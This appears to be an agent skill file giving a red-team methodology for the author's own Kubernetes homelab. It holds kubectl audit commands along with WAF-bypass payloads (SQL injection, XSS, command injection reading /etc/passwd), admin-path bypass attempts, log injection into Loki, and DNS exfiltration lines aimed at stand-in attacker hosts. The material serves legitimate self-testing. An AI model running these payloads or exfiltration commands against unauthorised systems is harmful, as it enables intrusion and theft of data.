---
name: security-testing
description: |
  Adversarial security testing methodology for the Kubernetes homelab. Covers network policy
  evasion, authentication bypass, privilege escalation, credential theft, and supply chain attacks.

  Use when: (1) Red team testing against the homelab, (2) Validating network policy enforcement,
  (3) Testing WAF bypass on external gateway, (4) Probing authentication layers,
  (5) Assessing container escape paths, (6) Auditing RBAC and service accounts,
  (7) Testing supply chain security of OCI promotion pipeline.

  Triggers: "security test", "red team", "pentest", "penetration test", "attack surface",
  "WAF bypass", "network policy evasion", "privilege escalation", "lateral movement",
  "credential theft", "container escape", "RBAC audit", "security audit", "vulnerability"
user-invocable: false
---

# Security Testing Methodology

## Attack Surface Overview

This homelab has six primary attack layers. See [references/attack-surface.md](references/attack-surface.md) for the full inventory of known weaknesses per layer.

| Layer | Controls | Key Weaknesses |
|-------|----------|----------------|
| **Network** | Cilium default-deny, profile CCNPs | Prometheus scrape baseline (any port), escape hatch window, intra-namespace freedom |
| **Gateway** | Coraza WAF, Istio Gateway API | WAF FAIL_OPEN, PL1 bypass, gateway `allowedRoutes.from: All` |
| **Authentication** | OAuth2-Proxy, Authelia 2FA, app-native | 7-day cookie, brute force window, Vaultwarden admin redirect bypass |
| **Authorization** | PodSecurity admission, RBAC | Minimal custom RBAC, homepage ClusterRole reads cluster |
| **Container** | Security contexts, Istio mTLS | Gluetun root+NET_ADMIN+no mesh, Cilium agent SYS_ADMIN |
| **Supply chain** | OCI promotion, Flux GitOps | Integration auto-deploy, PXE shell option |

---

## Phase 1: Network Policy Testing

### 1.1 Intra-Namespace Lateral Movement

The `baseline-intra-namespace` CCNP allows free communication within any namespace. Prove lateral movement:

```bash
# Deploy a test pod in a multi-service namespace
KUBECONFIG=~/.kube/dev.yaml kubectl run sectest --image=nicolaka/netshoot -n <target-ns> -- sleep 3600

# From the test pod, scan all services in the namespace
KUBECONFIG=~/.kube/dev.yaml kubectl exec -n <target-ns> sectest -- nmap -sT -p- <service-cluster-ip>

# Prove access to any port within the namespace
KUBECONFIG=~/.kube/dev.yaml kubectl exec -n <target-ns> sectest -- curl -s http://<other-pod-ip>:<any-port>
```

**Expected result**: Full access to every pod and port within the same namespace.

### 1.2 Cross-Namespace Escape

Test profile boundaries — a pod in `isolated` should only reach DNS:

```bash
# Deploy in an isolated-profile namespace
KUBECONFIG=~/.kube/dev.yaml kubectl run sectest --image=nicolaka/netshoot -n <isolated-ns> -- sleep 3600

# Attempt cross-namespace reach (should be blocked)
KUBECONFIG=~/.kube/dev.yaml kubectl exec -n <isolated-ns> sectest -- curl -s --connect-timeout 3 http://<pod-in-other-ns>:<port>

# Attempt internet egress (should be blocked — only DNS allowed)
KUBECONFIG=~/.kube/dev.yaml kubectl exec -n <isolated-ns> sectest -- curl -s --connect-timeout 3 https://httpbin.org/ip

# DNS exfiltration test (always works — baseline allows DNS)
KUBECONFIG=~/.kube/dev.yaml kubectl exec -n <isolated-ns> sectest -- nslookup exfil-test.attacker.example.com
```

### 1.3 Prometheus Label Impersonation

**CRITICAL**: The `baseline-prometheus-scrape` CCNP allows the Prometheus pod to reach ANY pod on ANY port with no `toPorts` restriction. Test if label matching is sufficient:

```bash
# Check what labels the scrape baseline matches on
KUBECONFIG=~/.kube/dev.yaml kubectl get ccnp baseline-prometheus-scrape -o yaml

# Deploy a pod with the Prometheus label in a test namespace
KUBECONFIG=~/.kube/dev.yaml kubectl run fake-prom --image=nicolaka/netshoot -n <test-ns> \
  --labels="app.kubernetes.io/name=prometheus" -- sleep 3600

# From fake-prom, attempt cross-namespace access
KUBECONFIG=~/.kube/dev.yaml kubectl exec -n <test-ns> fake-prom -- curl -s --connect-timeout 3 http://<target-pod>:<port>
```

**What to check**: Does the CCNP use `fromEndpoints` with namespace scoping (e.g., `io.kubernetes.pod.namespace: monitoring`), or just label matching? If namespace-scoped, impersonation fails. If label-only, any pod with the right label bypasses network policies.

### 1.4 Escape Hatch Abuse

Test the RBAC requirements for triggering the escape hatch:

```bash
# Check who can label namespaces
KUBECONFIG=~/.kube/dev.yaml kubectl auth can-i update namespaces --as=system:serviceaccount:<ns>:<sa>

# List all ClusterRoleBindings that grant namespace update
KUBECONFIG=~/.kube/dev.yaml kubectl get clusterrolebindings -o json | \
  jq '.items[] | select(.roleRef.name | test("admin|edit|cluster-admin")) | {name: .metadata.name, subjects: .subjects}'

# If a SA has permission, test the escape hatch
KUBECONFIG=~/.kube/dev.yaml kubectl label namespace <test-ns> network-policy.homelab/enforcement=disabled

# Verify: all traffic now allowed
KUBECONFIG=~/.kube/dev.yaml kubectl exec -n <test-ns> sectest -- curl -s --connect-timeout 3 http://<any-pod>:<any-port>

# CLEANUP: Re-enable immediately (alert fires at 5 minutes)
KUBECONFIG=~/.kube/dev.yaml kubectl label namespace <test-ns> network-policy.homelab/enforcement-
```

### 1.5 Gateway Route Injection

Both gateways have `allowedRoutes.namespaces.from: All`. Any namespace can attach an HTTPRoute:

```bash
# Create a rogue HTTPRoute exposing an internal service through the external gateway
cat <<'EOF' | KUBECONFIG=~/.kube/dev.yaml kubectl apply -f -
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: sectest-route-injection
  namespace: <test-ns>
spec:
  parentRefs:
    - name: external
      namespace: istio-gateway
  hostnames:
    - "sectest.dev.tomnowak.work"
  rules:
    - backendRefs:
        - name: <internal-service>
          port: <port>
EOF

# Test if the route is active
curl -k --resolve "sectest.dev.tomnowak.work:443:<external-ip>" https://sectest.dev.tomnowak.work/

# CLEANUP
KUBECONFIG=~/.kube/dev.yaml kubectl delete httproute sectest-route-injection -n <test-ns>
```

---

## Phase 2: Authentication & WAF Testing

### 2.1 Coraza WAF Bypass (External Gateway)

The WAF runs OWASP CRS at **Paranoia Level 1** (lowest). Test bypass techniques:

```bash
# Get the external gateway IP
EXTERNAL_IP=$(KUBECONFIG=~/.kube/dev.yaml kubectl get svc -n istio-gateway external -o jsonpath='{.status.loadBalancer.ingress[0].ip}')

# Basic SQL injection (should be blocked at PL1)
curl -k --resolve "vault.dev.tomnowak.work:443:${EXTERNAL_IP}" \
  "https://vault.dev.tomnowak.work/?id=1'+OR+1=1--"

# Double-encoding bypass attempt
curl -k --resolve "vault.dev.tomnowak.work:443:${EXTERNAL_IP}" \
  "https://vault.dev.tomnowak.work/?id=1%2527+OR+1%253D1--"

# Chunked transfer encoding (splits signature across chunks)
curl -k --resolve "vault.dev.tomnowak.work:443:${EXTERNAL_IP}" \
  -H "Transfer-Encoding: chunked" \
  -d $'3\r\nid=\r\n9\r\n1\' OR 1=\r\n2\r\n1-\r\n1\r\n-\r\n0\r\n\r\n' \
  "https://vault.dev.tomnowak.work/"

# JSON body (PL1 has limited JSON inspection)
curl -k --resolve "vault.dev.tomnowak.work:443:${EXTERNAL_IP}" \
  -H "Content-Type: application/json" \
  -d '{"search":"1\u0027 OR 1=1--"}' \
  "https://vault.dev.tomnowak.work/api/test"

# XSS via uncommon encoding
curl -k --resolve "vault.dev.tomnowak.work:443:${EXTERNAL_IP}" \
  "https://vault.dev.tomnowak.work/?q=%3Csvg%20onload%3Dalert(1)%3E"

# Command injection
curl -k --resolve "vault.dev.tomnowak.work:443:${EXTERNAL_IP}" \
  "https://vault.dev.tomnowak.work/?cmd=;cat+/etc/passwd"
```

### 2.2 WAF FAIL_OPEN Verification

The WAF uses `failStrategy: FAIL_OPEN`. If the WASM module is unavailable, all filtering stops:

```bash
# Check if the WasmPlugin is healthy
KUBECONFIG=~/.kube/dev.yaml kubectl get wasmplugin -n istio-gateway -o yaml

# Check if Coraza metrics are being emitted (absence = degraded/fail-open)
KUBECONFIG=~/.kube/dev.yaml kubectl exec -n monitoring prometheus-kube-prometheus-stack-0 -c prometheus -- \
  wget -qO- 'http://localhost:9090/api/v1/query?query=coraza_waf_requests_total' | jq '.data.result | length'

# If length is 0, WAF may be in fail-open state — verify with a known-bad request
```

### 2.3 Vaultwarden Admin Panel Access

The HTTPRoute redirects `/admin` to `/`. Test bypass from within the cluster:

```bash
# Direct pod access (bypasses gateway entirely)
VW_POD=$(KUBECONFIG=~/.kube/dev.yaml kubectl get pods -n vaultwarden -l app.kubernetes.io/name=vaultwarden -o jsonpath='{.items[0].metadata.name}')
KUBECONFIG=~/.kube/dev.yaml kubectl exec -n <test-ns> sectest -- curl -s -I http://${VW_POD_IP}:8080/admin

# Path variations against the gateway
curl -k --resolve "vault.dev.tomnowak.work:443:${EXTERNAL_IP}" -I "https://vault.dev.tomnowak.work/admin/"
curl -k --resolve "vault.dev.tomnowak.work:443:${EXTERNAL_IP}" -I "https://vault.dev.tomnowak.work/Admin"
curl -k --resolve "vault.dev.tomnowak.work:443:${EXTERNAL_IP}" -I "https://vault.dev.tomnowak.work/ADMIN"
curl -k --resolve "vault.dev.tomnowak.work:443:${EXTERNAL_IP}" -I "https://vault.dev.tomnowak.work//admin"
curl -k --resolve "vault.dev.tomnowak.work:443:${EXTERNAL_IP}" -I "https://vault.dev.tomnowak.work/admin?x=1"
```

### 2.4 OAuth2-Proxy Cookie Analysis

```bash
# Inspect cookie attributes from OAuth2-Proxy
curl -k --resolve "prometheus.internal.dev.tomnowak.work:443:<internal-ip>" \
  -c - "https://prometheus.internal.dev.tomnowak.work/" 2>/dev/null | grep oauth2

# Check cookie scope (domain, path, secure, httponly, samesite)
# 7-day expiry (168h) — can a captured cookie be replayed from a different client?
```

### 2.5 Authelia Brute Force Window

3 retries in 2 minutes, 5-minute ban. Test the boundaries:

```bash
# Is the ban per-IP or per-user?
# Test: Same user from different source IPs
# Test: Slow credential stuffing (1 attempt per 2 minutes stays under radar)
# Test: Does the ban apply to OIDC authorization flows or only direct login?

# Check Authelia regulation config
KUBECONFIG=~/.kube/dev.yaml kubectl get configmap -n authelia -o yaml | grep -A5 regulation
```

---

## Phase 3: Privilege Escalation

### 3.1 Service Account Token Enumeration

```bash
# List all service accounts with automounted tokens
KUBECONFIG=~/.kube/dev.yaml kubectl get pods -A -o json | \
  jq '.items[] | select(.spec.automountServiceAccountToken != false) | {ns: .metadata.namespace, pod: .metadata.name, sa: .spec.serviceAccountName}'

# Check RBAC permissions for a specific service account
KUBECONFIG=~/.kube/dev.yaml kubectl auth can-i --list --as=system:serviceaccount:<ns>:<sa>

# Particularly interesting: homepage SA has cluster-wide read
KUBECONFIG=~/.kube/dev.yaml kubectl auth can-i --list --as=system:serviceaccount:homepage:homepage
```

### 3.2 Container Security Audit

```bash
# Find containers running as root
KUBECONFIG=~/.kube/dev.yaml kubectl get pods -A -o json | \
  jq '.items[] | .spec.containers[] | select(.securityContext.runAsUser == 0 or .securityContext.runAsNonRoot == false) | {pod: .name, user: .securityContext.runAsUser}'

# Find containers with elevated capabilities
KUBECONFIG=~/.kube/dev.yaml kubectl get pods -A -o json | \
  jq '.items[] | .spec.containers[] | select(.securityContext.capabilities.add != null) | {pod: .name, caps: .securityContext.capabilities.add}'

# Find containers with writable root filesystem
KUBECONFIG=~/.kube/dev.yaml kubectl get pods -A -o json | \
  jq '.items[] | .spec.containers[] | select(.securityContext.readOnlyRootFilesystem != true) | {pod: .name, readonly: .securityContext.readOnlyRootFilesystem}'

# Find pods opted out of Istio mesh (no mTLS)
KUBECONFIG=~/.kube/dev.yaml kubectl get pods -A -o json | \
  jq '.items[] | select(.metadata.annotations["istio.io/dataplane-mode"] == "none") | {ns: .metadata.namespace, pod: .metadata.name}'
```

### 3.3 Crown Jewel: AWS IAM Key

The `external-secrets-access-key` in `kube-system` is a static AWS IAM key with read access to all SSM parameters:

```bash
# Check if any non-system service account can read secrets in kube-system
KUBECONFIG=~/.kube/dev.yaml kubectl auth can-i get secrets -n kube-system --as=system:serviceaccount:<ns>:<sa>

# Check the External Secrets operator RBAC
KUBECONFIG=~/.kube/dev.yaml kubectl get clusterrolebindings -o json | \
  jq '.items[] | select(.subjects[]?.name | test("external-secrets")) | {name: .metadata.name, role: .roleRef.name}'

# What SSM paths does this key unlock?
# /homelab/kubernetes/${cluster_name}/* — includes Cloudflare API token, GitHub OAuth secrets,
# NordVPN credentials, Istio mesh CA private key
```

### 3.4 Garage S3 Admin API from Gateway

```bash
# The Garage admin API (port 3903) is accessible from istio-gateway namespace
# Deploy a test pod in the gateway namespace (if RBAC allows)
# Or check if the gateway pods themselves can reach it

KUBECONFIG=~/.kube/dev.yaml kubectl exec -n istio-gateway <gateway-pod> -- \
  curl -s --connect-timeout 3 http://garage.garage.svc.cluster.local:3903/health

# If reachable, try admin operations
KUBECONFIG=~/.kube/dev.yaml kubectl exec -n istio-gateway <gateway-pod> -- \
  curl -s http://garage.garage.svc.cluster.local:3903/v1/status
```

---

## Phase 4: Data Exfiltration Paths

### 4.1 DNS Tunneling (Universal)

Every pod can reach DNS. This is an always-available exfiltration channel:

```bash
# Prove DNS tunneling works even from isolated namespaces
KUBECONFIG=~/.kube/dev.yaml kubectl exec -n <isolated-ns> sectest -- \
  nslookup $(echo "sensitive-data" | base64).exfil.example.com

# The query will fail to resolve, but the DNS query itself is the exfiltration
# Monitoring would need to watch for unusual DNS query patterns
```

### 4.2 Prometheus as Intelligence Source

```bash
# Service topology (who talks to whom)
KUBECONFIG=~/.kube/dev.yaml kubectl exec -n monitoring prometheus-kube-prometheus-stack-0 -c prometheus -- \
  wget -qO- 'http://localhost:9090/api/v1/query?query=istio_requests_total' | jq '.data.result[] | {src: .metric.source_workload, dst: .metric.destination_workload}'

# Secret rotation timing
KUBECONFIG=~/.kube/dev.yaml kubectl exec -n monitoring prometheus-kube-prometheus-stack-0 -c prometheus -- \
  wget -qO- 'http://localhost:9090/api/v1/query?query=certmanager_certificate_expiration_timestamp_seconds' | jq '.data.result'

# Node inventory with IPs
KUBECONFIG=~/.kube/dev.yaml kubectl exec -n monitoring prometheus-kube-prometheus-stack-0 -c prometheus -- \
  wget -qO- 'http://localhost:9090/api/v1/query?query=kube_node_info' | jq '.data.result[] | .metric'
```

### 4.3 Log Injection via Loki

```bash
# Can any pod send logs to Loki? (monitoring CNP allows fromEntities: cluster on port 3100)
KUBECONFIG=~/.kube/dev.yaml kubectl exec -n <any-ns> sectest -- \
  curl -s --connect-timeout 3 http://loki-headless.monitoring.svc.cluster.local:3100/ready

# If reachable, inject a crafted log entry
KUBECONFIG=~/.kube/dev.yaml kubectl exec -n <any-ns> sectest -- \
  curl -s -X POST http://loki-headless.monitoring.svc.cluster.local:3100/loki/api/v1/push \
  -H "Content-Type: application/json" \
  -d '{"streams":[{"stream":{"job":"injected","namespace":"security-test"},"values":[["'$(date +%s)000000000'","SECURITY TEST: Log injection successful"]]}]}'

# Check if the injected log appears
# This proves any pod can write arbitrary log entries to Loki
```

---

## Phase 5: Supply Chain

### 5.1 Flux Source Manipulation

```bash
# Check what Git/OCI sources Flux is watching
KUBECONFIG=~/.kube/dev.yaml flux get sources all

# Check GitHub token permissions (stored in flux-system namespace)
KUBECONFIG=~/.kube/dev.yaml kubectl get secret -n flux-system -o json | \
  jq '.items[] | select(.metadata.name | test("github|flux")) | .metadata.name'

# Check if webhook receivers are exposed
KUBECONFIG=~/.kube/dev.yaml kubectl get receivers -n flux-system
```

### 5.2 PXE Boot Attack Surface

```bash
# Check PXE boot server accessibility from pod network
KUBECONFIG=~/.kube/dev.yaml kubectl exec -n <any-ns> sectest -- \
  curl -s --connect-timeout 3 http://pxe-boot.pxe-boot.svc.cluster.local/

# Check if iPXE menu is accessible
KUBECONFIG=~/.kube/dev.yaml kubectl exec -n <any-ns> sectest -- \
  curl -s --connect-timeout 3 http://pxe-boot.pxe-boot.svc.cluster.local/boot.ipxe
```

---

## Test Resource Cleanup

**Always clean up after testing.** Run this after each session:

```bash
# Delete test pods
KUBECONFIG=~/.kube/dev.yaml kubectl delete pod sectest -n <ns> --ignore-not-found
KUBECONFIG=~/.kube/dev.yaml kubectl delete pod fake-prom -n <ns> --ignore-not-found

# Delete test HTTPRoutes
KUBECONFIG=~/.kube/dev.yaml kubectl delete httproute sectest-route-injection -n <ns> --ignore-not-found

# Re-enable network policy enforcement if disabled
KUBECONFIG=~/.kube/dev.yaml kubectl label namespace <ns> network-policy.homelab/enforcement- 2>/dev/null

# Verify no test resources remain
KUBECONFIG=~/.kube/dev.yaml kubectl get pods -A | grep sectest
KUBECONFIG=~/.kube/dev.yaml kubectl get httproute -A | grep sectest
```

---

## Finding Severity Guide

| Severity | Criteria | Example |
|----------|----------|---------|
| **Critical** | Remote code execution, credential theft, cluster takeover | AWS IAM key exfiltration, container escape to host |
| **High** | Authentication bypass, cross-namespace data access, privilege escalation | WAF bypass + unauthenticated admin access, RBAC escalation to read secrets |
| **Medium** | Information disclosure, policy bypass with limited impact | Prometheus intel gathering, intra-namespace lateral movement |
| **Low** | Minor policy gap, defense-in-depth weakness | DNS tunneling availability, 7-day cookie lifetime |
| **Informational** | Design observation, best practice deviation | FAIL_OPEN strategy (documented and accepted), PL1 WAF level |

---

## Cross-References

- [references/attack-surface.md](references/attack-surface.md) — Full inventory of known attack surfaces
- [network-policy SKILL](../network-policy/SKILL.md) — Cilium policy architecture and debugging
- [gateway-routing SKILL](../gateway-routing/SKILL.md) — Gateway API, TLS, and WAF configuration
- [sre SKILL](../sre/SKILL.md) — Kubernetes debugging methodology
- [k8s SKILL](../k8s/SKILL.md) — Cluster access and kubectl patterns

## Keywords

security testing, red team, penetration testing, network policy evasion, WAF bypass, authentication bypass, privilege escalation, lateral movement, container escape, RBAC audit, credential theft, supply chain attack, DNS tunneling, log injection
